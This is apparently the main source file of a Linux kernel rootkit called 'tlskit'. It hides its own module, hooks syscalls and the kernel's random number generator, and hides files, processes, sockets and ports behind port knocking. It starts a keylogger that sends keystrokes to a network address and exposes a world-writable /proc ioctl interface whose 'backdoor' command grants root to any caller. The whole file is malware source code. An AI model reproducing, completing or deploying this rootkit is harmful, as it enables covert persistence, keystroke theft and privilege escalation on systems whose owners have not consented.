#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/in.h>
#include <linux/uaccess.h>

#include "module_hiding.h"
#include "shared.h"
#include "syscall_hooking.h"
#include "priv_escalation.h"
#include "keylogger.h"
#include "csprng.h"
#include "file_hiding.h"
#include "process_hiding.h"
#include "proc_hook.h"
#include "socket_hiding.h"
#include "port_knocking.h"

static int cleanup(void *_data) {

    /* Disable port knocking */
    disable_port_knocking();

    /* Disable socket hiding */
    disable_socket_hiding();

    /* Disable process hiding */
    disable_process_hiding();

    /* Disable proc readdir hook */
    disable_proc_filter();

    /* Disable CSPRNG hook */
    disable_csprng_hook();

    /* Stop key logger */
    disable_key_logger();

    /* Disable file hiding */
    disable_file_hiding();

    /* Remove syscall hooks */
    disable_syscall_hooking();

    /* Wait until ioctl request has returned */
    msleep(500);

    /* Remove the proc entry */
    remove_proc_entry(PROC_ENTRY_NAME, NULL);

    // TODO sleep and free rootkit's memory

    return 0;
}

/*
 * Ioctl communication with the user-space control program
 */
static long ioctl(struct file *file, unsigned int cmd, unsigned long arg) {

    struct sockaddr_in addr;
    struct hidden_port pk;
    int ret;

    switch (cmd) {

        case RKCTL_PING:

            /*
             * Received a ping, this is used for checking if the rootkit is alive
             */
            break;

        case RKCTL_UNLOAD:

            /*
             * this has to be run async since we cannot remove the proc entry
             * while communicating via it
             */
            kthread_run(cleanup, NULL, "Cleanup_tlskit");
            break;

        case RKCTL_BACKDOOR:

            /*
             * Make the current task root
             */
            privilege_escalation();
            break;

        case RKCTL_START_KEY_LOGGER:

            /*
             * Enabled key logger
             */

            if (copy_from_user(&addr, (void *) arg, sizeof(struct sockaddr_in)) != 0) {
                return -EINVAL;
            }
            enable_key_logger(addr);
            break;

        case RKCTL_STOP_KEY_LOGGER:

            /*
             * Disable key logger
             */
            disable_key_logger();
            break;

        case RKCTL_HIDE_PID_ADD:

            /*
             * Hide pid
             */
            if (0 > (ret = hide_process_add(arg))) {
                return -EINVAL;
            }
            return ret;

        case RKCTL_HIDE_PID_RM:

            /*
             * Unhide pid
             */
            if (0 > (ret = hide_process_rm(arg))) {
                return -EINVAL;
            }
            return ret;

        case RKCTL_HIDE_SOCKET:

            /*
             * Hide socket
             */
            if (0 > (ret = hide_socket((unsigned short) arg))) {
                return -EINVAL;
            }
            return ret;

        case RKCTL_UNHIDE_SOCKET:

            /*
             * Unhide socket
             */
            if (0 > (ret = unhide_socket((unsigned short) arg))) {
                return -EINVAL;
            }
            return ret;

        case RKCTL_HIDE_PORT:

            /*
             * Protect port
             */
            if (copy_from_user(&pk, (struct hidden_port *) arg, sizeof(struct hidden_port)) != 0) {
                return -EINVAL;
            }
            return port_knocking_add(pk);

        case RKCTL_UNHIDE_PORT:

            /*
             * Unprotect port
             */
            return port_knocking_rm((unsigned short) arg);

        default:
            return -ENOTTY;
    }

    return 0;
}

static const struct file_operations proc_file_fops = {
        .owner = THIS_MODULE,
        .unlocked_ioctl = ioctl,
};

static int __init tlskit_init(void) {

    /*
     * Create a file in /proc for ioctl communication
     */

    if (proc_create(PROC_ENTRY_NAME, 0777, NULL, &proc_file_fops) == NULL) {
        return -1;
    }

    if (0 != hide_module()) {
        goto module_hiding_failed;
    }

    if (0 != enable_syscall_hooking()) {
        goto syscall_hooking_failed;
    }

    enable_file_hiding();

    init_key_logger();

    if (0 != enable_csprng_hook()) {
        goto csprng_failed;
    }

    if (0 != enable_proc_filter()) {
        goto proc_failed;
    }

    if (0 != enable_process_hiding()) {
        goto process_failed;
    }

    if (0 != enable_socket_hiding()) {
        goto socket_failed;
    }

    if (0 != enable_port_knocking()) {
        goto port_knocking_failed;
    }

    return 0;

/* disable all the enabled functionality */
port_knocking_failed:
    disable_socket_hiding();
socket_failed:
    disable_process_hiding();
process_failed:
    disable_proc_filter();
proc_failed:
    disable_csprng_hook();
csprng_failed:
    disable_file_hiding();
    disable_syscall_hooking();
syscall_hooking_failed:
module_hiding_failed:

    remove_proc_entry(PROC_ENTRY_NAME, NULL);
    return -1;
}

static void __exit tlskit_exit(void) {

    /*
     * Nothing to do here. The kernel module is only used for installing the rootkit. It
     * will be removed immediately after insertion.
     * For removing the rootkit, the user-space control program can be used.
     */

}

module_init(tlskit_init);
module_exit(tlskit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Leon Beckmann");